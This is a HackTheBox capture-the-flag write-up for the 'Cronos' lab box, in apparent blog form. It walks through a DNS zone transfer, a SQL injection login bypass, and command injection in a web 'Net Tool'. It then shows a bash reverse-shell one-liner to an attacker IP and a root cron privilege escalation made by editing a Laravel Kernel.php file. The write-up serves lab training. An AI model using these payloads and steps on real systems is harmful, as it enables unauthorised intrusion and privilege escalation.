---
title: "HackTheBox - WriteUp 8"
date: 2019-06-10T16:15:19+08:00
description: "HackTheBox 练手 - CronOS - PHP Cron"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# Cronos

## Before Start

nmap it, 22/tcp with openssh, 80/tcp with apache and 53/tcp weth ISC BIND.

80/tcp is the default page with apache, so we may need to modify our hosts.

# Attack

## DNS Enumeration

```bash
$ dig axfr @10.10.10.13 cronos.htb
; <<>> DiG 9.14.2 <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 613 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: 一 6月 10 16:20:51 CST 2019
;; XFR size: 7 records (messages 1, bytes 203)
```

After you get those records, just add them to your hosts.

## Access via web

At root domain, you just know it's a Laravel PHP Site.

At login domain, there's a login form. Check the source code, found nothing.

So there's must be a SQL Injection. Use username with SQL injection code `admin' -- -`. You logged in.

## Grab the packet

After you logged in, you get a command line page named "Net Tool", check the request it post. You will find it containes two parameters, `command` and `host`.

After you try, you will find these params has no blacklist. So use whatever you want.

We found a normal user called `noulis`, `command=cat&host=/home/noulis/user.txt`, Get User.

## Root

Fire up AntSword, and generate a shell then upload.

Then use `bash -c 'bash -i &>/dev/tcp/10.10.16.37/48484 0<&1'` to get a reverse shell.

After upload it, run LinEnum. You found a crontab running by root:

```bash
$ find -name artisan
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
$ crontab -l
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

Let's check the source code, The artisan will run the code in: `/var/www/laravel/app/Console/Kernel.php`, Next, just modify this file, and do whatever you want.

```php
    protected function schedule(Schedule $schedule)
    {
        // $schedule->command('inspire')
        //          ->hourly();
        $schedule->exec('cp /root/root.txt /tmp/y2y3g.txt')->everyMinute();
        $schedule->exec('chmod 777 /tmp/y2y3g.txt')->everyMinute();
    }
```

(END)
